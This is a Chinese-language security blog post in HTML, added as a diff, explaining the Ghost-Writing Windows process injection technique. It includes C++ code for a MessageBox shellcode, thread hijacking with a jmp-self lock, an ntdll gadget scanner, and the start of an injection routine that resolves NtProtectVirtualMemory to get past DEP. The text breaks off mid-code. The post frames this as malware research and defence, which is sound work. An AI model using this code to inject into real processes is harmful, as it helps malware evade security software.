@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cxvhacker.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="进程注入技术经常被恶意代码用来进行隐藏自身敏感行为,或获得更高的权限使用.了解各种注入技术有助于对恶意代码的研究以及防护,这篇文章来介绍一下Ghost-Writing注入.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows进程注入技术总结(二)">
+<meta property="og:url" content="https://cxvhacker.github.io/2021/02/26/iab/ProcessInject_2/index.html">
+<meta property="og:site_name" content="辰信安全基地">
+<meta property="og:description" content="进程注入技术经常被恶意代码用来进行隐藏自身敏感行为,或获得更高的权限使用.了解各种注入技术有助于对恶意代码的研究以及防护,这篇文章来介绍一下Ghost-Writing注入.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxvhacker.github.io/pic/iab/ProcessInject_2/TEST.gif">
+<meta property="article:published_time" content="2021-02-26T07:30:00.000Z">
+<meta property="article:modified_time" content="2021-02-26T09:22:58.088Z">
+<meta property="article:author" content="vhacker">
+<meta property="article:tag" content="Inject">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxvhacker.github.io/pic/iab/ProcessInject_2/TEST.gif">
+
+<link rel="canonical" href="https://cxvhacker.github.io/2021/02/26/iab/ProcessInject_2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows进程注入技术总结(二) | 辰信安全基地</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">辰信安全基地</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">严肃工作  活泼生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cxvhacker.github.io/2021/02/26/iab/ProcessInject_2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="vhacker">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="辰信安全基地">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows进程注入技术总结(二)
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-26 07:30:00 / 修改时间：09:22:58" itemprop="dateCreated datePublished" datetime="2021-02-26T07:30:00+00:00">2021-02-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows/" itemprop="url" rel="index"><span itemprop="name">Windows</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>现如今,大量的恶意代码多使用远线程注入技术去躲避安全软件的检测,隐藏自身的恶意行为,又或者为取地更高级别的权限.想要进行注入,也就意味着要将想要执行的代码写进目标进程的内存空间当中,它有可能作为一个dll被加载,也有可能作为数据直接写入到目标进程当中.有一项被称为Ghost-Writing的方式,提供了一种新的思路去将数据写入到目标进程当中.它进行了一项挑战,即在不打开目标进程的前提下(不调用OpenProcess,NtOpenProcess 或其他操作进程的函数),将数据写入到目标进程当中(实际上它没有打开进程而是操作了线程 :D ),更甚至不会调用任何写入内存的函数(不调用WriteProcessMemory,NtWriteVirtualMemory),并且该方法不需要提权,使用任意权限都可以生效.它的作者c0de90e7,在2007年将其公布.下面一边看实现代码一边解释一下它的工作原理.  </p>
+<h1 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h1><p>这类方法主要是通过类似ROP链的方式,在ntdll(或者其他dll)中寻找可用的代码,这段代码做写操作,然后可以通过控制栈控制其返回值,来不断使用这段代码对任意位置进行写操作.从而代替了写内存功能的api调用  </p>
+<h1 id="Ghost-Writing"><a href="#Ghost-Writing" class="headerlink" title="Ghost-Writing"></a>Ghost-Writing</h1><p>首先是shellcode.因为主要是介绍注入的原理,所以shellcode选择了x86版本的一个简单的代码(弹出一个MessageBox).  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> injcted_code[] = &#123;</span><br><span class="line"><span class="number">0x6A</span>,<span class="number">0x00</span>,                                                      <span class="comment">// PUSH 0</span></span><br><span class="line"><span class="number">0xE8</span>,<span class="number">0x0D</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                                       <span class="comment">// CALL NEXT (push caption 指针)</span></span><br><span class="line"><span class="string">'G'</span>,<span class="string">'h'</span>,<span class="string">'o'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'W'</span>,<span class="string">'r'</span>,<span class="string">'i'</span>,<span class="string">'t'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'g'</span>,<span class="number">0x00</span>,           <span class="comment">//(messagebox caption)</span></span><br><span class="line"><span class="number">0xE8</span>,<span class="number">0x1D</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                                       <span class="comment">// CALL NEXT (push text 指针)</span></span><br><span class="line"><span class="string">'R'</span>,<span class="string">'u'</span>,<span class="string">'n'</span>,<span class="string">'n'</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'g'</span>,<span class="string">' '</span>,<span class="string">'i'</span>,<span class="string">'n'</span>,<span class="string">'t'</span>,<span class="string">'o'</span>,<span class="string">' '</span>,<span class="string">'E'</span>,<span class="string">'X'</span>,    <span class="comment">//(messagebox text)</span></span><br><span class="line"><span class="string">'P'</span>,<span class="string">'L'</span>,<span class="string">'O'</span>,<span class="string">'R'</span>,<span class="string">'E'</span>,<span class="string">'R'</span>,<span class="string">'.'</span>,<span class="string">'E'</span>,<span class="string">'X'</span>,<span class="string">'E'</span>,<span class="string">'.'</span>,<span class="string">'.'</span>,<span class="string">'.'</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x6A</span>,<span class="number">0x00</span>,                                                      <span class="comment">// PUSH 0</span></span><br><span class="line"><span class="number">0x56</span>,                                                           <span class="comment">// PUSH ESI    (MessageBoxA 的返回地址，我们通过控制ESI来控制这个地址)</span></span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,                                       <span class="comment">// PUSH MessageBoxA    (在使用前会将次地址修正为函数地址)</span></span><br><span class="line"><span class="number">0xC3</span>                                                            <span class="comment">// RET (call MessageBoxA)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在注入的过程中,需要线程运行在一个稳定并且可控的状态,所以利用了jmp self(EB FE  JMP $),在线程运行完每一步操作后使epi停留在jmp $上,使线程形成了一种自锁状态.以便我们能够在一个可控的状态下继续操作线程.  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//等待线程运行到自锁状态</span></span><br><span class="line"><span class="comment">//arg1:目标线程句柄</span></span><br><span class="line"><span class="comment">//arg2:目标线程的环境块</span></span><br><span class="line"><span class="comment">//arg3:目标窗口的句柄</span></span><br><span class="line"><span class="comment">//arg4:jmp self的地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wait_for_thread_autolock</span><span class="params">(HANDLE thread_handle, CONTEXT* p_thread_context, HWND thread_windows_handle, DWORD auto_lock_eip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!(SetThreadContext(thread_handle, p_thread_context)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"SetThreadContext failure.\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		ResumeThread(thread_handle);</span><br><span class="line">		Sleep(<span class="number">30</span>);								<span class="comment">//这里sleep(0)也可以</span></span><br><span class="line">		SuspendThread(thread_handle);</span><br><span class="line">		GetThreadContext(thread_handle, p_thread_context);</span><br><span class="line">	&#125; <span class="keyword">while</span> (p_thread_context-&gt;Eip != auto_lock_eip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了稳定性和方便控制,对进行写操作的指令进行一些规则限定:  </p>
+<ul>
+<li>指令的形式为 MOV [REG1],REG2 或者 MOV [REG1+xx],REG2  </li>
+<li>寄存器必须是 EBX,EBP,ESI,EDI 其中一个  </li>
+<li>两个寄存器不能相同  </li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个函数是在内存中寻找MOV [REG1],REG2 或者 MOV [REG1+xx],REG2</span></span><br><span class="line"><span class="comment">//arg1:寻找指令的内存基址</span></span><br><span class="line"><span class="comment">//arg2:寻找指令的基于基址的偏移</span></span><br><span class="line"><span class="comment">//arg3:目标线程的环境块</span></span><br><span class="line"><span class="comment">//arg4:寻找的指令的目标寄存器,在目标线程环境块中的指针</span></span><br><span class="line"><span class="comment">//arg5:寻找的指令的源寄存器,在目标线程环境块中的指针</span></span><br><span class="line"><span class="comment">//arg6:如果指令是MOV [REG1],REG2则该变量返回0,如果指令是MOV [REG1+xx],REG2则该变量返回xx</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">disassemble_and_validate_mov</span><span class="params">(PUCHAR instruction_memory_base, ULONG* instruction_memory_index, CONTEXT* p_thread_context, DWORD** write_pointer, DWORD** write_item, <span class="keyword">int</span>* mov_offset_from_memory_register)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UCHAR write_pointer_reg_index, write_item_reg_index;                         <span class="comment">//用来记录找到的指令解析出来的寄存器下标</span></span><br><span class="line">    UCHAR modrm;                                                                 <span class="comment">//用来记录Opcode中ModRM结构</span></span><br><span class="line">    </span><br><span class="line">    DWORD* array_of_valid_register_addresses_in_context[<span class="number">8</span>];                      <span class="comment">//使用数组去标记哪些寄存器可用哪些寄存器不可用</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">0</span>] = <span class="literal">NULL</span>;                      <span class="comment">// EAX, not valid.</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">1</span>] = <span class="literal">NULL</span>;                      <span class="comment">// ECX, not valid.</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">2</span>] = <span class="literal">NULL</span>;                      <span class="comment">// EDX, not valid.</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">3</span>] = &amp;p_thread_context-&gt;Ebx;    <span class="comment">// EBX, valid</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">4</span>] = <span class="literal">NULL</span>;                      <span class="comment">// ESP, valid.   但是不使用</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">5</span>] = &amp;p_thread_context-&gt;Ebp;    <span class="comment">// EBX, valid.</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">6</span>] = &amp;p_thread_context-&gt;Esi;    <span class="comment">// ESI, valid.</span></span><br><span class="line">    array_of_valid_register_addresses_in_context[<span class="number">7</span>] = &amp;p_thread_context-&gt;Edi;    <span class="comment">// EDI, valid.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (instruction_memory_base[*instruction_memory_index] == <span class="number">0x89</span>)    <span class="comment">// 是否是 "MOV /r" 指令</span></span><br><span class="line">    &#123;</span><br><span class="line">        modrm = instruction_memory_base[*instruction_memory_index + <span class="number">1</span>];    <span class="comment">//如果是则开始进行OPcode的解析,去下一个字节ModRM去解析Mod dstRM srcRM.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((modrm &amp; <span class="number">0x80</span>) != <span class="number">0</span>)    <span class="comment">// 我们需要 Mod域为 00或01.</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        write_pointer_reg_index = modrm &amp; <span class="number">0x07</span>;        <span class="comment">//记录目的寄存器</span></span><br><span class="line">        write_item_reg_index = (modrm &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x07</span>;    <span class="comment">//记录源寄存器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write_pointer_reg_index == write_item_reg_index)    <span class="comment">//判断两个寄存器是否相同</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((modrm &amp; <span class="number">0x40</span>) == <span class="number">0</span>)    <span class="comment">//如果是 "MOV [REG1],REG2" 的形式.</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write_pointer_reg_index == <span class="number">5</span>)    <span class="comment">// 当是 "MOV [REG1],REG2"形式时,RM域为5则变成了"MOV [immediate32],REG2"所以排除掉.</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">            *mov_offset_from_memory_register = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            *instruction_memory_index += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">//如果是"MOV [REG1+xx],REG2"的形式.</span></span><br><span class="line">        &#123;</span><br><span class="line">            *mov_offset_from_memory_register = (<span class="keyword">signed</span> <span class="keyword">char</span>)instruction_memory_base[*instruction_memory_index + <span class="number">2</span>];</span><br><span class="line">            * instruction_memory_index += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后检查两个寄存器的值是否在我们一开始预设好的可用寄存器当中</span></span><br><span class="line">        <span class="keyword">if</span> ((array_of_valid_register_addresses_in_context[write_pointer_reg_index] != <span class="literal">NULL</span>) &amp;&amp; (array_of_valid_register_addresses_in_context[write_item_reg_index] != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            *write_pointer = array_of_valid_register_addresses_in_context[write_pointer_reg_index];</span><br><span class="line">            *write_item = array_of_valid_register_addresses_in_context[write_item_reg_index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要提到的是,刚刚的函数只是为了寻找符合要求的mov指令,而我们实际需要从其他dll中获取的指令分为两种  </p>
+<blockquote>
+<ul>
+<li><em>JMP $</em></li>
+<li><em>MOV [REG1],REG2 / MOV [REG1+xx],REG2</em><br><em>RET</em><br>为了更加灵活,也可以是<br><em>MOV [REG1],REG2 / MOV [REG1+xx],REG2</em><br><em>POP REGx</em><br><em>POP REGx</em><br><em>ADD ESP,xx</em><br><em>..</em><br><em>RET</em>  </li>
+</ul>
+</blockquote>
+<p>做好准备工作,可以开始进行注入的主要过程了.  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注入函数</span></span><br><span class="line"><span class="comment">//arg1:目标线程句柄</span></span><br><span class="line"><span class="comment">//arg2:注入的代码指针</span></span><br><span class="line"><span class="comment">//arg3:注入的代码大小(单位是dword)</span></span><br><span class="line"><span class="comment">//arg4:目标线程的窗口句柄</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject</span><span class="params">(HANDLE thread_handle, DWORD* injected_code, ULONG number_of_dwords_to_inject, HWND thread_window_handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD* write_pointer = <span class="literal">nullptr</span>;         <span class="comment">//接收 mov指令中的目标操作寄存器在线程context中相应位置的指针</span></span><br><span class="line">    DWORD* write_item = <span class="literal">nullptr</span>;            <span class="comment">//接收 mov指令中的源操作寄存器在线程context中相应位置的指针</span></span><br><span class="line">    <span class="keyword">int</span> mov_offset_from_memory_register;    <span class="comment">//寻找MOV指令函数的传出参数，如果找到的是mov [reg],reg 则被置为0，如果找到的是mov [reg+xx],reg 则被置为xx</span></span><br><span class="line"></span><br><span class="line">    HMODULE ntdll_handle = <span class="number">0</span>;</span><br><span class="line">    DWORD NtProtectVirtualMemory_address = <span class="number">0</span>;    <span class="comment">//用来过DEP使用</span></span><br><span class="line">    PUCHAR ntdll_code_address = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS ntdll_peheader_pointer = <span class="number">0</span>;</span><br><span class="line">    ULONG ntdll_code_size, i, j, k;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//准备在ntdll当中寻找需要的指令(mov/jmp$)</span></span><br><span class="line">    ntdll_handle = GetModuleHandleA(<span class="string">"NTDLL.DLL"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ntdll_handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Can`t get ntdll handle.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NtProtectVirtualMemory_address = (DWORD)GetProcAddress(ntdll_handle, <span class="string">"NtProtectVirtualMemory"</span>); </span><br><span class="line">    <span class="keyword">if</span> (!NtProtectVirtualMemory_address)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 